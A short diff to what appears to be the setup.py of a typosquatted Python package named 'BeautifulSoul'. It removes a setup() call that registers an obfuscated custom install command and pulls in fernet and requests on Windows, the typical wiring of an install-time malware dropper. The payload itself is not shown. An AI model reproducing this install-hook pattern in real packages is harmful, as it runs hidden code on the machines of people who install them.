@@ -18,22 +18,5 @@ class qqWQhvLNsovuqnngHtBKDVgDDkmukZHpayhYXFVRHjFNpZgKQpOBdVgVmamCrWIXFJGFZtGmmX
             install.run(self)
 
 
-setup(
-    name="BeautifulSoul",
-    version=VERSION,
-    author="ElMbzmT",
-    author_email="qyUHOknJNPl@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': qqWQhvLNsovuqnngHtBKDVgDDkmukZHpayhYXFVRHjFNpZgKQpOBdVgVmamCrWIXFJGFZtGmmXGVDlYfKuPoBrygnMJNrOssbLKTwYLqnvuwNhIpHwTsMzrQadpdSKP,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
 
